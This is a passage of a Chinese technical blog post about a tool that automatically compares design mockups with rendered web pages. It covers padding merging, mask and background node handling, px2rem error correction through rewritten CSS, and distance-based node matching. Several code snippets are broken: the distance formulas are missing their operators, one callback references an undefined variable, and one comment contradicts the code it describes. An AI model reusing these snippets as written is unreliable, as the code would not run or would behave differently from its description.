<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e7a05bc50005456aa8ab4f2933fcff42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=hzJfsAajEZzBPvjWBvPlot%2FBCJw%3D" alt="拼接边距场景" loading="lazy"/></p>
<p>所以需要将纯粹地用来作为拼接边距的padding，从当前节点的width和height中排除出去，让节点的尺寸中不包含任何多余的无效padding。本处理方法的核心逻辑如下</p>
<ol>
<li>对每个节点的上、下、左、右四个方向独立处理</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript">paddingInfoDirectionList.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">currentPosition</span>) =&gt;</span> {
  <span class="hljs-comment">// top, right, bottom, left</span>
})
</code></pre>
<ol start="2">
<li>判断当前方向的 padding 是否可以被合并（可能需要检查子节点是否占用了这个空间）</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> targetDirectionPaddingValue = <span class="hljs-title function_">getTargetDirectionPaddingValue</span>({
  currentNodeInfo,
  flatNodeMap,
  <span class="hljs-attr">position</span>: currentPosition,
})

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getTargetDirectionPaddingValue</span>(<span class="hljs-params">{ currentNodeInfo, position }: JudgeMergableConfig</span>) {
  <span class="hljs-keyword">const</span> paddingKey = <span class="hljs-title function_">camel</span>(<span class="hljs-string">`padding <span class="hljs-subst">${position}</span>`</span>) <span class="hljs-keyword">as</span> keyof <span class="hljs-title class_">PaddingInfo</span>
  <span class="hljs-comment">// 是否存在目标方向的padding</span>
  <span class="hljs-keyword">const</span> targetDirectionPaddingValue = currentNodeInfo.<span class="hljs-property">paddingInfo</span>[paddingKey]
  <span class="hljs-keyword">return</span> targetDirectionPaddingValue || <span class="hljs-number">0</span>
}
</code></pre>
<ol start="3">
<li>执行合并操作</li>
<li><strong>扩展边界框</strong>：将 padding 空间纳入 boundingRect</li>
<li><strong>减少 padding 值</strong>：从 paddingInfo 中扣除已合并的值</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 合并padding
 * <span class="hljs-doctag">@param</span> curNodeInfo 当前节点信息
 * <span class="hljs-doctag">@param</span> position 目标方向
 * <span class="hljs-doctag">@param</span> paddingInfo 目标方向的padding值
 * <span class="hljs-doctag">@returns</span> 合并后的节点信息
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMergePadding</span>(<span class="hljs-params">curNodeInfo: NodeInfo, position: <span class="hljs-string">'left'</span> | <span class="hljs-string">'right'</span> | <span class="hljs-string">'top'</span> | <span class="hljs-string">'bottom'</span>, paddingInfo: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">const</span> clonedBoundingRect = <span class="hljs-title function_">clone</span>(curNodeInfo.<span class="hljs-property">boundingRect</span>)
  <span class="hljs-keyword">if</span> (position === <span class="hljs-string">'left'</span>) {
    clonedBoundingRect.<span class="hljs-property">x</span> += paddingInfo
    clonedBoundingRect.<span class="hljs-property">width</span> -= paddingInfo
  }
  <span class="hljs-keyword">if</span> (position === <span class="hljs-string">'right'</span>) {
    clonedBoundingRect.<span class="hljs-property">width</span> -= paddingInfo
  }
  <span class="hljs-keyword">if</span> (position === <span class="hljs-string">'top'</span>) {
    clonedBoundingRect.<span class="hljs-property">y</span> += paddingInfo
    clonedBoundingRect.<span class="hljs-property">height</span> -= paddingInfo
  }
  <span class="hljs-keyword">if</span> (position === <span class="hljs-string">'bottom'</span>) {
    clonedBoundingRect.<span class="hljs-property">height</span> -= paddingInfo
  }
  <span class="hljs-keyword">return</span> clonedBoundingRect
}

<span class="hljs-comment">/**
 * 减去已被合并的padding值
 * <span class="hljs-doctag">@param</span> curNodeInfo 当前节点信息
 * <span class="hljs-doctag">@param</span> position 目标方向
 * <span class="hljs-doctag">@param</span> paddingInfo 目标方向的padding值
 * <span class="hljs-doctag">@returns</span> 减去padding值后的节点信息
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleSubtractPaddingValue</span>(<span class="hljs-params">curNodeInfo: NodeInfo, position: <span class="hljs-string">'left'</span> | <span class="hljs-string">'right'</span> | <span class="hljs-string">'top'</span> | <span class="hljs-string">'bottom'</span>, paddingInfo: <span class="hljs-built_in">number</span></span>) {
  <span class="hljs-keyword">const</span> clonedPaddingInfo = <span class="hljs-title function_">clone</span>(curNodeInfo.<span class="hljs-property">paddingInfo</span>)
  <span class="hljs-keyword">const</span> paddingKey = <span class="hljs-title function_">camel</span>(<span class="hljs-string">`padding <span class="hljs-subst">${position}</span>`</span>) <span class="hljs-keyword">as</span> keyof <span class="hljs-title class_">PaddingInfo</span>
  clonedPaddingInfo[paddingKey] -= paddingInfo
  <span class="hljs-keyword">return</span> clonedPaddingInfo
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">processingPaddingInfo</span>(<span class="hljs-params"/>) {
	<span class="hljs-comment">//...</span>
  <span class="hljs-keyword">const</span> paddingMergedBoundingRect = <span class="hljs-title function_">handleMergePadding</span>(
    currentNodeInfo, 
    currentPosition, 
    targetDirectionPaddingValue
  )
  <span class="hljs-keyword">const</span> newPaddingInfo = <span class="hljs-title function_">handleSubtractPaddingValue</span>(
    currentNodeInfo, 
    currentPosition, 
    targetDirectionPaddingValue
  )
	<span class="hljs-comment">//...</span>
}
</code></pre>
<h4 data-id="heading-14"><code>shrinkRectBounding</code>收缩矩形边界</h4>
<h5 data-id="heading-15">为什么要收缩矩形边界？</h5>
<p>在UI设计稿中，存在一些质量不可控的现象，比如
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0497940248b74e039385d1e4045a38d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=5bd7aSPDY1Jphp7Pv%2BBeETJxD%2Bc%3D" alt="初始效果" loading="lazy"/></p>
<p>在这个设计稿中，看似左侧的成色+定级标准节点与右侧的上下边距混乱，毫无居中的感觉。但是倘若我们对他进行一下变更：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8e7e1057d6694876ad4f92774a755c0e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=Xt%2Fg32I%2BDmMGh6yZCFhjLIZi9BM%3D" alt="居中后的效果" loading="lazy"/>实际上只需要处理好左侧的高度，右侧的高度完全可以和左侧相同，并处理成为 <code>justify-content: space-between</code>即可。</p>
<p>但是当FE拿到第一张图的时候，并不会一眼就看出来左右两侧的高度是可以完全一样的（因为选中左侧的时候是一个大的rectangle）</p>
<p>这个例子告诉我们，在UI侧常会存在一些凌乱的、难以用直觉判断实际效果的设计节点。这时候如果想要用自动化的方案进行比对，就需要针对这些噪声进行降噪处理。在本文中，采用的就是<strong>以实际渲染内容为主的节点收缩方案</strong></p>
<p>主要逻辑就是尽可能的收缩节点的尺寸，让其可以紧凑地包裹在内容之外，尽可能地不包含多余的空间。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac402f7ae2cc49cd8f3f49ef50fa89f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=oX4BLxAaphuTu2bJRH97t8DSOIg%3D" alt="设计稿边距收缩效果" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96e2678c771e4fc0bdc677873ff07e78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=qi4XIlYZn8RgCHwA%2Bx5%2Fn1EYxBI%3D" alt="HTML边距收缩效果" loading="lazy"/></p>
<p>在做完这些工作后，便可以进行节点与其相邻节点的间距计算了。</p>
<h3 data-id="heading-16">Dom与设计稿数据的预处理逻辑</h3>
<p>所谓预处理逻辑，旨在解决归一化处理数据时遇到的一些特殊case。包括但不限于：设计稿蒙版节点处理、设计稿使用rectange节点作为背景色节点的逻辑处理、前端px2rem误差精度修正等</p>
<h4 data-id="heading-17">设计稿蒙版节点处理</h4>
<p>在设计稿中 Mask 的形式如下</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">GROUP</span>
├─ 图片 <span class="hljs-selector-tag">A</span>
├─ 图片 <span class="hljs-selector-tag">B</span>
└─ 圆形 (<span class="hljs-attribute">isMask</span>: true)  ← <span class="hljs-selector-tag">Mask</span> 图层
</code></pre>
<p>其效果为：圆形作为遮罩，图片 A 和 B 只显示圆形范围内的部分。</p>
<p>虽然蒙版节点与被蒙版的节点是同一层的几个节点，但是从效果上来说，被蒙版的节点，可以视为蒙版的子节点。因此，将蒙版节点及被蒙版的节点视为一个父子结构，可以有效简化数据结构的处理。其流程如下：</p>
<ol>
<li><strong>查找 Mask 节点</strong>
<ol>
<li>先<strong>反转</strong>子节点列表（因为设计工具中 mask 在图层堆叠的底部）</li>
<li>找出所有可见的 <code>isMask: true</code> 节点的索引</li>
</ol>
</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> reversedChildNodeList = originChildNodeList.<span class="hljs-title function_">toReversed</span>()

<span class="hljs-keyword">const</span> childMastIndexList = reversedChildNodeList
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">it</span> =&gt;</span> !!it.<span class="hljs-property">isVisible</span>)
  .<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">prev, it, index</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (!nodeCanBeMaskSet.<span class="hljs-title function_">has</span>(curNode.<span class="hljs-property">type</span>) || !curNode.<span class="hljs-property">isMask</span>) {
      <span class="hljs-keyword">return</span> prev
    }
    <span class="hljs-keyword">return</span> [...prev, index]
  }, [] <span class="hljs-keyword">as</span> <span class="hljs-built_in">number</span>[])
</code></pre>
<ol start="2">
<li><strong>计算 Mask 影响范围</strong>
<ol>
<li>Mask 节点会影响它<strong>上方</strong>的所有节点（直到遇到下一个 mask）</li>
<li>计算每个 mask 的影响范围 <code>[start, end]</code></li>
</ol>
</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> maskChildIndexStartEndList = childMastIndexList
  .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">it, index, originArr</span>) =&gt;</span> {
    <span class="hljs-keyword">if</span> (index === <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">return</span> [reversedChildNodeList.<span class="hljs-property">length</span> - it, reversedChildNodeList.<span class="hljs-property">length</span>]
    }
    <span class="hljs-keyword">return</span> [reversedChildNodeList.<span class="hljs-property">length</span> - it, reversedChildNodeList.<span class="hljs-property">length</span> - originArr[index - <span class="hljs-number">1</span>] - <span class="hljs-number">1</span>]
  })
  .<span class="hljs-title function_">toReversed</span>()
</code></pre>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">原始顺序（反转后）：</span>
[<span class="hljs-attr">0:</span> <span class="hljs-string">图片A</span>, <span class="hljs-attr">1:</span> <span class="hljs-string">图片B</span>, <span class="hljs-attr">2:</span> <span class="hljs-string">Mask1</span>, <span class="hljs-attr">3:</span> <span class="hljs-string">图片C</span>, <span class="hljs-attr">4:</span> <span class="hljs-string">Mask2</span>]
                      <span class="hljs-string">↑</span>                    <span class="hljs-string">↑</span>
<span class="hljs-string">Mask1</span> <span class="hljs-string">影响范围:</span> [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>]  <span class="hljs-string">(图片A,</span> <span class="hljs-string">图片B)</span>
<span class="hljs-string">Mask2</span> <span class="hljs-string">影响范围:</span> [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]  <span class="hljs-string">(图片C)</span>
</code></pre>
<p>3.  <strong>创建新的 FRAME 容器</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> newFrameNode = {
  ...emptyFrameNode,           <span class="hljs-comment">// 基础 FRAME 属性</span>
  <span class="hljs-attr">id</span>: <span class="hljs-string">`<span class="hljs-subst">${id}</span><span class="hljs-subst">${MASK_REPLACE_SUFFIX}</span>`</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">`<span class="hljs-subst">${name}</span><span class="hljs-subst">${MASK_REPLACE_SUFFIX}</span>`</span>,
  <span class="hljs-comment">// 继承 mask 节点的位置和尺寸</span>
  absoluteTransform,
  relativeTransform,
  x, y, width, height,
  cornerRadius,                <span class="hljs-comment">// 继承圆角</span>
  <span class="hljs-attr">clipsContent</span>: <span class="hljs-literal">true</span>,          <span class="hljs-comment">// 关键：裁剪内容</span>
  children,                    <span class="hljs-comment">// 被遮罩的内容</span>
}
</code></pre>
<ol start="4">
<li>
<p><strong>优化：单个 Mask 且尺寸一致</strong></p>
<p>如果只有一个 mask 且和父容器尺寸相同，直接替换父节点，减少层级。</p>
</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> isSameSize = currentNode.<span class="hljs-property">width</span> === firstMaskRelpaceNodeInfo.<span class="hljs-property">width</span> 
  &amp;&amp; currentNode.<span class="hljs-property">height</span> === firstMaskRelpaceNodeInfo.<span class="hljs-property">height</span>

<span class="hljs-keyword">if</span> (newChildGroupList.<span class="hljs-property">length</span> === <span class="hljs-number">1</span> &amp;&amp; isSameSize) {
  <span class="hljs-comment">// 直接合并到父节点</span>
  <span class="hljs-keyword">return</span> {
    ...currentNode,
    ...firstMaskRelpaceNodeInfo,
  }
}
</code></pre>
<h4 data-id="heading-18">设计稿背景节点的提升</h4>
<p>由于一些原Adobe软件 or sketch的操作习惯，且在MasterGo工具中，Group节点无法主动设置宽高，因此常使用group节点+rectangle节点的方式去撑开一个节点或者给一个节点设置背景色。而这个rectangle节点在比对过程中则属于一个需要忽略的节点，因此在此预处理逻辑中，需要识别背景色节点，并将背景色提升到父节点的属性上去，简化图层结构。其处理流程如下：</p>
<ol>
<li><strong>分离背景图层和内容图层</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">judgeIsBgStyleRectangle</span>(<span class="hljs-params">currentNode: PenNode | RectangleNode, parentNode: FrameNode | GroupNode</span>) {
  <span class="hljs-keyword">const</span> { width, height } = currentNode
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">width</span>: parentWidth, <span class="hljs-attr">height</span>: parentHeight } = parentNode
  <span class="hljs-keyword">const</span> deltaWidth = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(width - parentWidth)
  <span class="hljs-keyword">const</span> deltaHeight = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">abs</span>(height - parentHeight)
  <span class="hljs-comment">// 大于为图片 + mask 或者 图片+overflow hidden的场景</span>
  <span class="hljs-keyword">const</span> isSameSize = deltaWidth &lt; <span class="hljs-number">2</span> &amp;&amp; deltaHeight &lt; <span class="hljs-number">2</span>
  <span class="hljs-keyword">return</span> isSameSize
}

<span class="hljs-comment">// 背景图层：RECTANGLE/PEN 且判断为背景样式</span>
<span class="hljs-keyword">const</span> bgStyleNodeList = currentNode.<span class="hljs-property">children</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">it</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (it.<span class="hljs-property">type</span> !== <span class="hljs-string">'RECTANGLE'</span> &amp;&amp; it.<span class="hljs-property">type</span> !== <span class="hljs-string">'PEN'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">judgeIsBgStyleRectangle</span>(it, currentNode)
})

<span class="hljs-comment">// 其他图层：非背景的内容</span>
<span class="hljs-keyword">const</span> restNodeChildList = currentNode.<span class="hljs-property">children</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">it</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (it.<span class="hljs-property">type</span> !== <span class="hljs-string">'RECTANGLE'</span> &amp;&amp; it.<span class="hljs-property">type</span> !== <span class="hljs-string">'PEN'</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
  <span class="hljs-keyword">return</span> !<span class="hljs-title function_">judgeIsBgStyleRectangle</span>(it, currentNode)
})
</code></pre>
<ol start="2">
<li><strong>合并背景样式</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 合并所有背景图层的填充</span>
<span class="hljs-keyword">const</span> combinedFillList = bgStyleNodeList.<span class="hljs-title function_">flatMap</span>(<span class="hljs-function"><span class="hljs-params">node</span> =&gt;</span> node.<span class="hljs-property">fills</span> || [])
</code></pre>
<h4 data-id="heading-19">前端px2rem误差精度修正</h4>
<p>转转App的px2rem方案走的是常规的px2rem方案，root上的<code>font-size</code>配置为了<code>document.clientWidth / 10</code>的值，rem值的取值精度为两位小数。</p>
<p>在前端响应式配置设置为iphone se（<code>375px</code>）的场景下，其页面实际渲染的值并非设计稿的一半。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec3ce85caaa94568a1115539b332073f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=a9BfSPsIZ0R0NLH1DzGkh34Gkdk%3D" alt="px2rem误差" loading="lazy"/></p>
<p>单个节点的场景误差尚可以用四舍五入的逻辑修正，但是在多数值拼接的场景下，误差可能会被放大，导致比对异常。因此需要对px2rem精度进行修正，以避免过多的误差出现。</p>
<ul>
<li><strong>模块结构</strong></li>
</ul>
<pre><code class="hljs language-shell" lang="shell">📦 css-hacker
├─ main-hacker.ts      # 主流程编排
├─ dom-parser.ts       # 解析页面样式表
├─ css-fetcher.ts      # 获取 CSS 内容
├─ css-modifier.ts     # 修改 CSS 内容
├─ css-injector.ts     # 注入修改后的 CSS
├─ convert-px2rem-deviation.ts  # rem 单位转换插件
└─ types.ts            # 类型定义
</code></pre>
<ul>
<li><strong>核心流程</strong></li>
</ul>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[开始] --&gt; B[解析页面获取外部样式表 URL]
    B --&gt; C{有外部样式表?}
    C --&gt;|否| D[结束]
    C --&gt;|是| E[批量获取 CSS 内容]
    E --&gt; F[遍历每个 CSS 文件]
    F --&gt; G[使用 modifier 修改内容]
    G --&gt; H[注入修改后的 CSS]
    H --&gt; I[删除原始 link 标签]
    I --&gt; J{还有文件?}
    J --&gt;|是| F
    J --&gt;|否| K[完成]
</code></pre>
<ul>
<li><strong>核心逻辑：</strong></li>
</ul>
<p>通过px2rem逻辑，构建一个1-2000数值的哈希Map，key为rem的值，value为原px值。</p>
<p>通过劫持页面CSS文件，用一个自定义的postcss插件，配合预配置的Map，将px值反向映射为设计稿原值。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 单例1-2000映射Map</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">PxConvertMapSingleton</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-attr">instance</span>: <span class="hljs-title class_">PxConvertMapSingleton</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">convertMap</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>&gt;

  <span class="hljs-keyword">private</span> <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">convertMap</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">generateConvertMap</span>()
  }

  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title function_">getInstance</span>(): <span class="hljs-title class_">PxConvertMapSingleton</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">PxConvertMapSingleton</span>.<span class="hljs-property">instance</span>) {
      <span class="hljs-title class_">PxConvertMapSingleton</span>.<span class="hljs-property">instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PxConvertMapSingleton</span>()
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">PxConvertMapSingleton</span>.<span class="hljs-property">instance</span>
  }

  <span class="hljs-keyword">private</span> <span class="hljs-title function_">convertPx</span>(<span class="hljs-attr">originPxValue</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">const</span> originRemValue = originPxValue / <span class="hljs-number">750</span> * <span class="hljs-number">10</span>
    <span class="hljs-keyword">const</span> remValue = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(originRemValue * <span class="hljs-number">100</span>) / <span class="hljs-number">100</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(remValue * <span class="hljs-number">37.5</span> * <span class="hljs-number">1000</span>) / <span class="hljs-number">1000</span>
  }

  <span class="hljs-keyword">private</span> <span class="hljs-title function_">generateConvertMap</span>(): <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>&gt; {
    <span class="hljs-keyword">const</span> startValue = <span class="hljs-number">1</span>
    <span class="hljs-keyword">const</span> endValue = <span class="hljs-number">2000</span>

    <span class="hljs-keyword">const</span> entries = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: endValue - startValue + <span class="hljs-number">1</span> }).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_, index</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> curValue = index + startValue
      <span class="hljs-keyword">if</span> (curValue === <span class="hljs-number">1</span>) {
        <span class="hljs-keyword">return</span> [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
      }

      <span class="hljs-keyword">return</span> [<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">convertPx</span>(curValue), curValue] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>
    })

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(entries)
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getConvertMap</span>(): <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">convertMap</span>
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getPxConvertMap</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Map</span>&lt;<span class="hljs-built_in">number</span>, <span class="hljs-built_in">number</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">PxConvertMapSingleton</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getConvertMap</span>()
}

</code></pre>
<p>再通过设计稿数据处理方案转换成前端页面实际的px值，最终形成新的css样式表注入到HTML中。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> remRegex = <span class="hljs-regexp">/(\d+(?:\.\d+)?|\.\d+)rem/gi</span>
<span class="hljs-comment">/** 处理CSS属性值中的rem单位，转换为px */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processRemInValue</span>(<span class="hljs-params">value: <span class="hljs-built_in">string</span>, baseFontSize: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">if</span> (!value || !value.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'rem'</span>)) {
    <span class="hljs-keyword">return</span> value
  }
  <span class="hljs-keyword">const</span> convertMap = <span class="hljs-title function_">getPxConvertMap</span>()
  <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">replace</span>(remRegex, <span class="hljs-function">(<span class="hljs-params">_match, remValue</span>) =&gt;</span> {
    <span class="hljs-comment">// rem值</span>
    <span class="hljs-keyword">const</span> convertedRemValue = <span class="hljs-title class_">Number</span>(remValue)
    <span class="hljs-comment">// 四舍五入取4位精度</span>
    <span class="hljs-keyword">const</span> convertedPxValue = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(convertedRemValue * baseFontSize * <span class="hljs-number">10000</span>) / <span class="hljs-number">10000</span>
    <span class="hljs-keyword">const</span> designValue = convertMap.<span class="hljs-title function_">get</span>(convertedPxValue)

    <span class="hljs-keyword">if</span> (!designValue) {
      <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${convertedRemValue}</span>rem`</span>
    }
    <span class="hljs-keyword">return</span> <span class="hljs-string">`<span class="hljs-subst">${convertDesignToPx(designValue)}</span>px`</span>
  })
}

<span class="hljs-comment">// post-css插件</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-attr">convertPx2RemDeviation</span>: <span class="hljs-title class_">PluginCreator</span>&lt;<span class="hljs-title class_">Px2RemDeviationOptions</span>&gt; = <span class="hljs-function">(<span class="hljs-params">opts</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> combinedOptions = { ...(opts || {}), ...defaultOptions }
  <span class="hljs-keyword">const</span> { baseFontSize } = combinedOptions

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">postcssPlugin</span>: <span class="hljs-string">'convert-px2rem-deviation'</span>,

    <span class="hljs-title class_">Rule</span>(<span class="hljs-attr">rule</span>: <span class="hljs-title class_">Rule</span>) {
      rule.<span class="hljs-title function_">walkDecls</span>(<span class="hljs-function">(<span class="hljs-params">decl: Declaration</span>) =&gt;</span> {
        <span class="hljs-keyword">const</span> value = decl.<span class="hljs-property">value</span>

        <span class="hljs-keyword">if</span> (!value || !value.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'rem'</span>)) {
          <span class="hljs-keyword">return</span>
        }

        <span class="hljs-keyword">const</span> newValue = <span class="hljs-title function_">processRemInValue</span>(value, baseFontSize)
        decl.<span class="hljs-property">value</span> = newValue
      })
    },
  }
}

convertPx2RemDeviation.<span class="hljs-property">postcss</span> = <span class="hljs-literal">true</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> convertPx2RemDeviation

</code></pre>
<ul>
<li>
<p><strong>为什么不通过<code>computedStyle</code>进行反向映射？</strong></p>
<p>原因在于<code>computedStyle</code>获取到的值无法通过1-2000的Map直接进行映射，比如一个<code>box-sizing:border-box</code>的div节点，需要面临三种场景：</p>
<ul>
<li>如果其宽度是直接设置的，则需要拆解成<code>padding</code>、<code>border</code> 、<code>width</code>三部分分别进行映射。</li>
<li>如果其宽度是撑满父容器的，则需要受控于其父容器的宽度。</li>
<li>如果是被子节点撑开的，则又需要分别计算子节点的宽度进行组合。</li>
</ul>
<p>其整体判断逻辑复杂程度高，难以理清。所以采用css注入的方式从css文件层面去解决精度问题，是当前最优解。</p>
</li>
</ul>
<h3 data-id="heading-20">Dom节点与UI节点的匹配</h3>
<p>节点匹配策略为一块较为独立且完整的模块，由于时间、人力等一些问题，目前的节点匹配方案为常规的IOU匹配方案，匹配准确率约为40%~60%左右，有较高的优化空间，并将在后续的开发中探索匹配层面的优化方案，以提高匹配率和检测准确度。</p>
<h4 data-id="heading-21">基本匹配策略</h4>
<p>节点匹配算法采用<strong>欧几里得距离计算</strong>的方式，综合考虑节点的位置和尺寸信息：</p>
<ul>
<li><strong>位置距离</strong>：计算两个节点中心点的欧几里得距离</li>
<li><strong>尺寸距离</strong>：计算两个节点宽高的欧几里得距离</li>
<li><strong>综合距离</strong>：通过加权平均得到最终匹配分数</li>
</ul>
<h4 data-id="heading-22">距离计算公式</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 位置距离计算</span>
<span class="hljs-keyword">const</span> positionDistance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
  (x - mgX)  <span class="hljs-number">2</span> + (y - mgY)  <span class="hljs-number">2</span>
)
 
<span class="hljs-comment">// 尺寸距离计算</span>
<span class="hljs-keyword">const</span> sizeDistance = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(
  (width - mgWidth)  <span class="hljs-number">2</span> + (height - mgHeight)  <span class="hljs-number">2</span>
)
 
<span class="hljs-comment">// 综合距离（位置权重 0.7，尺寸权重 0.3）</span>
<span class="hljs-keyword">const</span> totalDistance = positionDistance  <span class="hljs-number">0.7</span> + sizeDistance  <span class="hljs-number">0.3</span>
 
</code></pre>
<h4 data-id="heading-23">匹配阈值机制</h4>
<ul>
<li><strong>最大可接受距离</strong>：MAX_ACCEPTABLE_DISTANCE = 100</li>
<li>只有当综合距离小于阈值时，才会被认为是有效匹配</li>
